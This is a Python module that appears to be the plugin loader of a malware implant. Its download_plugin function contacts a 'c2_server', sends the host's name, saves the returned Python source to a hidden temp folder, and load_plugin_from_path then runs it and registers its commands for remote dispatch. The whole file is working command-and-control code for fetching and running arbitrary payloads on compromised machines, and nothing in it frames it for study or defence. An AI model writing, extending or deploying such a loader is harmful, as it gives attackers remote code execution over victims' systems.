import os
import sys
import json
import re
import urllib.request
import urllib.parse
import importlib.util
import tempfile

from cryptography.fernet import Fernet

COMMANDS: dict[str, tuple[str, callable]] = {}
PLUGIN_INFO: dict[str, dict] = {}

PLUGIN_CACHE_DIR = os.path.join(tempfile.gettempdir(), ".hw-plugins")


class PluginContext:
    def __init__(self, name: str):
        self._name = name
        self._registered: list[str] = []

    def register_command(self, name: str, handler: callable) -> None:
        COMMANDS[name] = (self._name, handler)
        self._registered.append(name)

    @property
    def registered_commands(self) -> list[str]:
        return list(self._registered)


def _ensure_cache():
    os.makedirs(PLUGIN_CACHE_DIR, exist_ok=True)


def download_plugin(c2_server: str, plugin_name: str, hostname: str = '') -> str | None:
    _ensure_cache()
    params = urllib.parse.urlencode({'hostname': hostname}) if hostname else ''
    url = f"{c2_server}/api/extensions/{plugin_name}/source?{params}" if params else f"{c2_server}/api/extensions/{plugin_name}/source"
    try:
        req = urllib.request.Request(url)
        req.add_header('Accept', 'application/octet-stream')
        resp = urllib.request.urlopen(req, timeout=15)
        code = resp.read()
        dest = os.path.join(PLUGIN_CACHE_DIR, f"{plugin_name}.py")
        with open(dest, 'wb') as f:
            f.write(code)
        return dest
    except Exception:
        return None


def load_plugin_from_path(path: str) -> dict | None:
    name = os.path.splitext(os.path.basename(path))[0]
    if name in PLUGIN_INFO:
        return PLUGIN_INFO[name]

    try:
        spec = importlib.util.spec_from_file_location(name, path)
        if not spec or not spec.loader:
            return None
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)

        plugin_name = getattr(mod, 'PLUGIN_NAME', name)
        plugin_ver = getattr(mod, 'PLUGIN_VERSION', '0.0')
        plugin_desc = getattr(mod, 'PLUGIN_DESCRIPTION', '')

        ctx = PluginContext(plugin_name)
        mod.init(ctx)

        PLUGIN_INFO[plugin_name] = {
            'name': plugin_name,
            'version': plugin_ver,
            'description': plugin_desc,
            'commands': ctx.registered_commands,
        }
        return PLUGIN_INFO[plugin_name]
    except Exception as e:
        return None


def unload_plugin(plugin_name: str) -> bool:
    if plugin_name not in PLUGIN_INFO:
        return False
    to_remove = [k for k, v in COMMANDS.items() if v[0] == plugin_name]
    for k in to_remove:
        del COMMANDS[k]
    del PLUGIN_INFO[plugin_name]
    return True


def list_plugins() -> dict:
    return dict(PLUGIN_INFO)


def dispatch(command: str, params: dict, shared_state: dict) -> str | None:
    entry = COMMANDS.get(command)
    if not entry:
        return None
    _plugin_name, handler = entry
    try:
        return handler(params, shared_state)
    except Exception as e:
        return f'plugin error ({_plugin_name}): {e}'
